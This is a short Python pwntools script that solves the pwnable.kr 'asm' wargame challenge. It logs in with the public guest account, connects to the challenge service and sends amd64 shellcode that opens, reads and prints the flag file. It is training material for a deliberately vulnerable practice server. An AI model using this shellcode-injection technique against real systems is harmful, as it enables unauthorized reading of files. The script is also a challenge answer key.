from pwn import *

shell = ssh('asm', 'pwnable.kr', 2222, password='guest')
sh = shell.process('/bin/sh', env={'PS1':''})
sh.sendline('nc 0 9026')

context.arch="amd64"
shellcode = shellcraft.amd64.open("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
shellcode += shellcraft.amd64.read("rax", "rsp", 64)
shellcode += shellcraft.amd64.write(1, "rsp", 64)

_ = sh.recvuntil("shellcode:")

print("[*]send : " + enhex(asm(shellcode)))

sh.sendline(asm(shellcode))

print(sh.recvline())
